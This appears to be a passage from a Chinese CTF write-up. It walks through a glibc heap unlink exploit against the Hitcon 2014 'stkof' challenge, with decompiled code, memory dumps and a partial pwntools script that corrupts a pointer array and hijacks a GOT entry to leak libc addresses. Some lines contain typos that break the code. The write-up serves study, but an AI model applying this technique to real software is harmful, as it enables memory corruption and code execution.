-3，由于target本来是一个指向heap的指针，那么如果程序后面对heap的内存修改实际上是对这个数组的修改，如果这个内容可控的话，我们就可以修改会被调用的函数指针和是否通过认证的标志位，进而实现绕过认证或者任意代码执行的效果。或者是存在一个指针，这个指针在正常的业务中会被写入用户可控的内容，那么就构成了write
what where的模式，可以实现往任意地方写任意内容的原型。
## Hitcon 2014 stkof
我们使用Hitcon 2014一道赛题来看看这种unlink的实战。  
题目文件的[下载链接](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/unlink/2014_hitcon_stkof)
###  目标
我们的目标是通过标准输入完成任意代码执行。
###  调试环境搭建
使用patchelf失败，显示的是segment
fault，现在还不清楚为什么，由于这个文件是一个可执行文件而不是共享目标文件，貌似patchelf在给可执行文件做patch的时候是有点问题。看到有一篇博文[RCTF
2020 Pwn note](https://xuanxuanblingbling.github.io/ctf/pwn/2020/06/01/note/)
介绍了不用patch直接通过修改环境变量以及直接运行ld文件，把二进制文件当做参数传给ld文件的方法是可以成功的。受次启发，使用gdb的时候直接调试ld文件，然后在gdb设置环境变量和参数，但是同样报segment
fault。无奈只能求助于gdbserver
attach，由于我们是可以在命令中直接运行的，最终终于搭建调试环境，至于为什么其他方法不行，我有机会再研究，也欢迎知道原理的同学交流一下。
由于后面还要往标准输入写入特殊符号，所以还是要借助python实现调试
    from pwn import *
    target = process("./stkof", env={"LD_PRELOAD":"./libc.so.6_1"})
    elf = ELF("stkof")
    libc = ELF("./libc.so.6_1")
这些代码可以实现利用python起这个二进制文件，然后通过target.sendline发送任意的字符
###  信息收集
看一下文件格式
    pws@pws:~/Desktop/workplace/heap_challenge/unlink$ file strof 
    strof: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, 
    interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=4872b087443d1e52ce720d0a4007b1920f18e7b0, stripped
尝试运行一下libc.so.6,发现是2.23版本的glibc
checksec可以看到开启了nx和栈cookie，
考虑堆溢出漏洞  
利用ida分析二进制，先看一眼使用的库函数
有malloc，所以重点关注对堆内存的操作
###  找到漏洞
我们可以简单推断出这是一个堆溢出的漏洞，我们看下malloc的逻辑
    __int64 sub_400936()
    {
    __int64 size; // [rsp+0h] [rbp-80h]
    char *v2; // [rsp+8h] [rbp-78h]
    char s[104]; // [rsp+10h] [rbp-70h] BYREF
    unsigned __int64 v4; // [rsp+78h] [rbp-8h]
    v4 = __readfsqword(0x28u);
    fgets(s, 16, stdin);
    size = atoll(s);
    v2 = (char *)malloc(size);
    if ( !v2 )
    return 0xFFFFFFFFLL;
    (&global_var)[++dword_602100] = v2;
    printf("%d\n", (unsigned int)dword_602100);
    return 0LL;
    }
malloc的大小是用户可控的，再观察操作堆空间的地方
    fgets(s, 16, stdin);
    n = atoll(s);
    ptr = (&global_var)[v2];
    for ( i = fread(ptr, 1uLL, n, stdin); i > 0; i = fread(ptr, 1uLL, n, stdin) )
    同样是用户可以操控写入的长度的，所以这个的确是一个堆溢出的漏洞。
###  利用思路
我们可以看到这个被溢出的堆的地址被写入了global_var这个数组里面，而且我们也可以连续触发两个malloc得到连续的chunk，因此符合我们的unlink利用条件。  
首先需要两次malloc，我们同样尝试malloc的参数为0xa0,根据逆向结果我们输入1就可以触发分配的逻辑  
我们通过1, 0xa0 连续3次得到了两个挨着的大小为0xb0的chunk
    chunk1 :0x0000000000e064e0      
    chunk2 :0x0000000000e06590
现在我们要在chunk1中构造一个虚假的chunk，目的是骗过unlink的检查  
存储chunk1指针的地址为0x602150,我们要把0x602150-3*8 和 0x602150-2*8放到内存中，按照下面这个图
我们只需要根据程序的业务照做这件事就行了，首先得到chunk1的控制权,我们需要根据索引值得到，根据这个图
我们则可以看出来chunk1 相对于0x0000000000e064e0
0x602140这个数组开始地址的偏移为2，所以我们要输入2来获得对这个堆的控制权。  
现在我们要溢出chunk1，修改chunk2的的开头部分  
所以我们要得到需要写入的长度为0xa0 + 8*2 = 0xb0
需要溢出chunk2的prev size和curent size两个字段，分别赋值为0xa0,和0xb0  
因此我们构造的payload为
    addr_of_chunk1_ptr = 0x602150
    fake_fd = addr_of_chunk1_ptr - 8 *3
    fake_bk = addr_of_chunk1_ptr - 8 2
    payload = (p64(0x0) + p64(0xa0) + p64(fake_fd) + p64(fake_bk)).ljust(0xa0,'\x00') + p64(0xa0) + p64(0xb0)
发送我们的数据之后的内存布局
    0xe064e0:       0x0000000000000000      0x00000000000000a0
    0xe064f0:       0x0000000000602138      0x0000000000602140
    ...
    0xe06580:       0x00000000000000a0      0x00000000000000b0
    0xe06590:       0x0000000000000000      0x0000000000000000
然后我们需要释放chunk2指针  
执行`remove(3)`  
我们再次观察全局数组的存储变量
可以看到我们存储heap指针的地方已经变为了0x602150 – 3 8 = 0x0x602138  
因此我们已经实现了unlink操作，后面可以通过操作0x602138指针来重写0x602150中的内容，我们可以借助这个实现往任意地址写入任意内容的操作，但是如何利用这个获取root
shell呢？
要想获取root shell我们就必须能够调用类似system的这种函数  
我们目前拥有对内存空间任意读写的能力，那么只要我们能够知道system函数的地址，我们就可以把system函数地址写入到一个会被调用的函数，如free，strlen等等的got表中，但是关键问题是如何获得system函数地址
###  如何获得system函数地址
由于二进制文件中没有调用system，所以不能通过plt调用system，我们只能想办法获得system在libc中的地址，但是由于开启了随机化后，这个地址就是不是固定的，索性的是我们可以通过其他库函数的地址，通过相对偏移获得system函数地址  
那么问题转化成了如何获取其他库函数，比如strlen函数的地址
由于strlen函数被调用了，那么二进制中的got表中就包含strlen项，如果我们能够通过puts，printf，write等函数打印这个strlen在got表中的地址，就能够得到got表中包含strlen的真实地址。
那么如何让打印函数传入got表的内存地址呢?  
首先挑选一个打印函数，比如我们可以使用puts函数来打印内存，因为puts比较简单，只需要一个参数
然后再物色一个拥有参数是用户可控的地址的函数，这个要结合二进制函数的业务，符合这个条件的函数有  
`strlen((&global_var)[v1]) <= 3`  
`free((&global_var)[v1])`  
让(&global_var)[v1]的值为got表一个库函数的地址值，比如free函数got表地址0x602018  
就是往内存中写入0x602018，这个是可以实现的，因为我们已经可以通过unlink拿到了对0x0x602138之后内存的读写权限，并且可以写入任意内容。
然后我们通过修改free或者strlen的got表，让他们的内容修改为puts函数的plt表的地址，那么以后在调用free或者strlen函数的时候就可以调用puts  
unlink之后我们可以读写地址为0x0602138开始的内存,借助这个我们可以修改0x602150内存中的内容为strlen
got表地址，，strlen在got表中的地址为0x602030。修改0x602148中的内容为free got表地址0x602018
我们可以通过业务逻辑发送payload为`p64(0) + p64(0) + p64(0x602018) + p64(0x602030)`  
发送payload之前0x602138中的内容为
发送payload之后的内容为
我们可以看到我们已经将strlen和free的got表地址写入到了数组中  
我们再次利用业务逻辑就可以修改strlen的got表为puts.plt为0x400760
这次的payload为p64(0x400760)
我们先看发送数据之前strlen got表中的内容为
由于我们还没有调用这个函数，所以它的值为0  
然后我们看看发送完数据之后的内容为
我们已经成功修改了strlen的got表，让他指向了puts  
我们只需要调用strlen((&global_var)[v1]) 让
(&global_var)[v1]值为0x602018,就可以触发puts(0x602018)，而0x602018中存储的是真正的free函数的地址  
通过业务逻辑调用strlen，让v1为1的得到free的地址  
得到free的地址为
拿到free的地址之后，我们就可以进一步得到system函数的地址，后面的事情就比较简单了。
###  我的exp代码(仅完成到打印free地址的部分)
    from pwn import *
    target = process("./stkof", env={"LD_PRELOAD":"./libc.so.6_1"})
    elf = ELF("stkof")
    libc = ELF("./libc.so.6_1")
    # gdb.attach(target, gdbscript='b *0x400b7a')
    # I/O Functions
    def add(size):
      target.sendline("1")
      target.sendline(str(size))
      print target.recvuntil("OK\n")
    def write_data(index, size, data):
      target.sendline("2")
      target.sendline(str(index))
      target.sendline(str(size))
      target.send(data)
      print target.recvuntil("OK\n")
    def remove(index):
      target.sendline("3")
      target.sendline(str(index))
      print target.recvuntil("OK\n")
    def view(index):
      target.sendline("4")
      target.sendline(str(index))
      #print "pillar"
      leak = target.recvline()
      leak = leak.replace("\x0a", "")
      leak = u64(leak + "\x00"*(8-len(leak)))
      print hex(leak)
      #print "men"
      print target.recvuntil("OK\n")
      return leak
    addr_of_chunk1_ptr = 0x602150
    fake_fd = addr_of_chunk1_ptr - 8 *3
    fake_bk = addr_of_chunk1_ptr - 8 2
    payload = (p64(0x0) + p64(0xa0) + p64(fake_fd) + p64(fake_bk)).ljust(0xa0,'\x00') + p64(0xa0) + p64(0xb0)
    payload2 = p64(0) + p64(0) + p64(0x602018) + p64(0x602030)
    payload3 = p64(0x400760)
    add(0xa0)
    add(0xa0)
    add(0xa0)
    write_data(2,0xb0,payload)
    remove(3)
    write_data(2,8*4,payload2)
    write_data(2,8,payload3)
    view(1)
## 小结
虽然这种unlink攻击并不能实现任意地址写入任意内容的攻击效果，但是如果符合这种一个数组中包含有一个指向堆的指针这种场景，并且这个堆可以溢出修改后面的chunk，即能够得到两个相邻的chunk，在free被溢出的chunk的时候，那么本来指向heap的指针就实际上指向的是数组，那么如果后续有用到heap指针的地方，就可以实现对数组的读写。
而实际上这个堆指针就是一个指向可以被用户读写的内存的指针，因此我们的利用思路可以是当有一个堆指针被写入了一个数组，我们通过溢出将存储这个堆指针的元素变成了存储数组的开头，然后我们通过业务代码继续操作这个被篡改了的“堆指针”去修改数组的内容，我们可以进一步修改存储这个“堆指针”的地方。